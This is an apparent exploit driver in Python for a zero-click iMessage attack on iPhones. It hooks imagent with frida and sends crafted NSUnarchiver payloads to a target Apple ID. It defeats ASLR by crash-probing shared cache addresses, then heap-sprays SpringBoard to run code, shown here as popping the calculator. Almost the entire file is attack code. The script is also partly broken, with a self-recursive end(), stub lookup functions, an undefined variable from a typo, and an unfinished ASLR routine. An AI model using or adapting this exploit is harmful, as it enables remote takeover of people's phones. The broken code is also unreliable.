import frida
import random
import subprocess
import sys
import time
import os

CRASH_DELAY = 10
HEAPSPRAY_ADDR = 0x140000000
SHARED_CACHE_BASE = None
SHARED_CACHE_WRITABLE_REGION_OFFSET = 0x31acc00
TARGET_APPLE_ID = 'foo@bar.baz'

# The class representing a target device to which iMessages can be sent.
class Device:
  def __init__(self, apple_id):
    self.apple_id = apple_id
    self.ready = False
    self._delivery_receipts = 0

    # Set up frida hooking of imagent to inject our payloads
    session = frida.attach('imagent')
    code = open('./hook.js', 'r').read()
    script = session.create_script(code)
    script.on('message', self._on_message)
    script.load()

    while not self.ready:
      time.sleep(1)

  def send_message(self, message):
    self._delivery_receipts = 0
    subprocess.check_call(['osascript', 'sendMessage.applescript', self.apple_id, message])
    while self._delivery_receipts == 0:
      time.sleep(1)

  # Send the current payload as the ATI key, which will be deserialized in imagent
  # Wait until the message has been received or the waiting time surpass CRASH_DELAY.
  def send_payload_to_imagent(self):
    return self._send_payload('ATI')

  # Send the current payload as the BP key, which will be deserialized in Springboard.
  # Wait until the message has been received or the waiting time surpass CRASH_DELAY
  def send_payload_to_springboard(self):
    return self._send_payload('BP')

  def _send_payload(self, key):
    self._delivery_receipts = 0
    subprocess.check_call(['osascript', 'sendMessage.applescript', self.apple_id, f'INJECT_{key}'])
    count = 0
    while self._delivery_receipts == 0 and count < CRASH_DELAY:
      time.sleep(1)
      count += 1
    return self._delivery_receipts > 0

  # The handler to cope with receiving message
  def _on_message(self, message, data):
    if message['type'] == 'send':
      payload = message['payload']
      if payload == 'READY':
        self.ready = True
      elif payload == 'DELIVERY_RECEIPT':
        self._delivery_receipts += 1
      else:
        pass

# The generator class to generate different NSUnarchiver payload and write it to /private/var/tmp/com.apple.message/payload 
class Payloads:
  @staticmethod
  def generate_calcpop_heapspray_payload(shared_cache_base):
    subprocess.check_call(['./gen_payload_calcpop.py', hex(shared_cache_base)])
    # Convert to binary format to save a few bytes.
    subprocess.check_call(['plutil', '-convert', 'binary1', '/private/var/tmp/com.apple.message/payload'])
  
  @staticmethod
  def generate_kernelpanic_heapspray_payload(shard_cache_base):
    subprocess.check_call(['/gen_payload_kernelpanic.py', hex(shared_cache_base)])
    # Convert to binary format to save a few bytes.
    subprocess.check_call(['plutil', '-convert', 'binary1', '/private/var/tmp/com.apple.message/payload'])

  @staticmethod
  def generate_addr_deref_payload(addr):
    subprocess.check_call(['/gen_payload_deref.py', hex(addr)])

  @staticmethod
  def generate_fakeobj_dealloc_trigger(addr):
    subprocess.check_call(['/gen_fakeobj_dealloc.py', hex(addr)])


class SharedCacheProfile:
  def __init__(self, zero_map, ptr_map, tp_map):
    assert(len(zero_map) == len(ptr_map) == len(tp_map))

    self.base = 0x180000000
    self.zero_map = zero_map
    self.ptr_map = ptr_map
    self.tp_map = tp_map

  def map(self, new_base):
    self.base = new_base

  def start(self):
    return self.base
  
  def end(self):
    return self.end()

  def size(self):
    return len(self.zero_map) * 8 * 8
  
  def __str__(self):
    return f'SharedCacheProfile profile mapped between 0x{self.start()} and 0x{self.end()}'

  def isNull(self, address):
    return self._bitmap_lookup(address, self.zero_map)
  
  def isTaggedPtr(self, address):
    return self._bitmap_lookup(address, self.tp_map)

  def isPointer(self, address):
    return self._bitmap_lookup(address, self.ptr_map)

  def _bitmap_lookup(self, address, bitmap):
    pass

# The function sends crash payload to walk over the address range in which the shared cache is
# mapped in 128MB steps until it finds a valid address
def find_valid_shared_cache_address(target):
  # Find the valid shared cache from 0x180000000 to 0x280000000
  start = 0x180000000
  end = 0x280000000
  step = 128 * 1024 * 1024

  print('[INFO]: Trying to find a valid address ...')

  for address in range(start, end, step):
    print(f'Testing address 0x{address} ...')

    Payloads.generate_addr_deref_payload(address)
    if target.send_payload_to_imagent():
      print(f'[INFO]: 0x{address} is valid!')
      return address

  raise Exception('Couldn\'t find a valid address ...')


def break_aslr(target):
  found_address = find_valid_shared_cache_address(target)
  
  print('[INFO]: Start breaking your ASLR, please wait ...')

  # We now have a valid address inside the shared_cache. With that, and the binary profile
  # of the shared cache, we can now construct a list of candidate slide offsets.
  shared_cache_nullmap = open('./shared_cache_profile/shared_cache_nullmap.bin', 'rb').read()
  shared_cache_ptrmap = open('./shared_cache_profile/shared_cache_ptrmap.bin', 'rb').read()
  shared_cache_tpmap = open('./shared_cache_profile/shared_cache_tpmap.bin', 'rb').read()
  shared_cache = SharedCacheProfile(shared_cache_nullmap, shared_cache_ptrmap, shared_cache_tpmap)

  possible_base_addresses = []

  page_size = 0x4000
  min_base = 0x280000000
  max_base = 0x180000000

  for candidate in range(shared_cache.start(), shared_cache.end(), page_size):
    if shared_cache.isNull(candidate) or shared_cache.isTaggedPtr(candidate):
      base_address = found_address - (candidate - shared_cache.start())
      if base_address > max_base and base_address + shared_cache.size() < min_base:
        possible_base_addresses.append(base_address)

  print(f'[INFO]: Have {len(possible_base_addresses)} potential candidates for the dyld shared cache slide')

  candidates = []
  for address in possible_base_addresses:
    candidate = SharedCacheProfile(shared_cache_nullmap, shared_cache_ptrmap, shared_cache_tpmap)
    candidate.map(address)

    if candidate.start() < min_base:
      min_base = candidate.start()
    if candidate.end() > max_base:
      max_base = candidate.end()

    assert(candidate.isNull(found_address) or candidate.isTaggedPtr(found_address))
    candidates.append(candidate)

  assert(min_base < max_base)
  print(f'[INFO]: Shared cache is mapped somewhere between 0x{min_base} and 0x{max_base}')
  print(f'[INFO]: Now determining exact base address of shared cache ...')

  # TODO: determine the exact base address of shared cache


def pwn(target):
  print(f'[Info]: Start to exploit remote iPhone {TARGET_APPLE_ID} ...')
  os.makedirs('/private/var/tmp/com.apple.messages/', exist_ok=True)

  shared_cache_base = SHARED_CACHE_BASE
  # Obtain 
  if shared_cache_base is None:
    print('[Info]: Break ASLR ...')
    shared_cache_base = break_aslr(target)

  print(f'[Info]: Shared cache is mapped at 0x{shared_cache_base}')
  target.send_message(f'Your shared cache starts at 0x{shared_cache_base}')

  input('[Info]: Press enter to continue ...')

  print('[Info]: Generate payload to pop calculator ...')
  Payloads.generate_calcpop_heapspray_payload(shared_cache_base)

  SPRAYSIZE = 768 * 1024 * 1024
  MSGSIZE = 32 * 1024 * 1024
  NUM_SPRAY = SPRAYSIZE // MSGSIZE
  for i in range(NUM_SPRAY):
    target.send_payload_to_springboard()
    time.sleep(1)
    print(f'[Info]: Sending heap spray part {i + 1}/{NUM_SPRAY}')

  time.sleep(10)
  target.send_message('Enjoy the calculator!!')
  print('[Info]: Open calculator successfully!')

  Payloads.generate_fakeobj_dealloc_trigger(HEAPSPRAY_ADDR + 0x3ff8)
  target.send_payload_to_springboard()

  time.sleep(1000)


target = Device(TARGET_APPLE_ID)
pwn(target)